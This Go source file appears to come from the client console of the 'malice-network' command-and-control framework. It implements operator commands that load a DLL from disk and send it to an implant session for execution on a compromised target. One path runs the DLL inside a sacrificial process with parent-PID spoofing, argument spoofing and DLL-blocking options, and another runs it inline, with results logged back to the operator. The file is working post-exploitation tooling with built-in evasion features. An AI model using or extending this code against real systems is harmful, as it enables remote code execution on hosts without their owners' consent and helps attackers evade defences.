package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/helper"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
	"os"
	"path/filepath"
)

func ExecuteDLLCmd(cmd *cobra.Command, con *console.Console) {
	path := cmd.Flags().Arg(0)
	params := cmd.Flags().Args()[1:]
	ppid, _ := cmd.Flags().GetUint("ppid")
	processname, _ := cmd.Flags().GetString("process")
	argue, _ := cmd.Flags().GetString("argue")
	isBlockDll, _ := cmd.Flags().GetBool("block_dll")
	entrypoint, _ := cmd.Flags().GetString("entrypoint")
	dllBin, err := os.ReadFile(path)

	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(dllBin) != consts.DLLFile {
		console.Log.Errorf("The file is not a DLL file\n")
		return
	}
	execDLL(path, dllBin, params, int(ppid), processname, argue, entrypoint, isBlockDll, con)
}

func execDLL(pePath string, dllBin []byte, paramString []string, ppid int, processname, argue, entrypoint string,
	isBlockDll bool, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	task, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:       filepath.Base(pePath),
		Bin:        dllBin,
		Type:       consts.ModuleExecutePE,
		EntryPoint: entrypoint,
		Output:     true,
		Sacrifice: &implantpb.SacrificeProcess{
			Output:   true,
			BlockDll: isBlockDll,
			Ppid:     uint32(ppid),
			Argue:    argue,
			Params:   append([]string{processname}, paramString...),
		},
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(task.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}

func InlineDLLCmd(ctx *grumble.Context, con *console.Console) {
	session := con.GetInteractive()
	if session == nil {
		return
	}
	sid := con.GetInteractive().SessionId
	pePath := ctx.Args.String("path")
	dllBin, err := os.ReadFile(pePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}
	if helper.CheckPEType(dllBin) != consts.DLLFile {
		console.Log.Errorf("The file is not a DLL file\n")
		return
	}
	shellcodeTask, err := con.Rpc.ExecutePE(con.ActiveTarget.Context(), &implantpb.ExecuteBinary{
		Name:       filepath.Base(pePath),
		Bin:        dllBin,
		EntryPoint: ctx.Flags.String("entrypoint"),
		Type:       consts.ModuleExecutePE,
	})

	if err != nil {
		console.Log.Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		con.SessionLog(sid).Consolef("Executed PE on target: %s\n", resp.GetAssemblyResponse().GetData())
	})
}
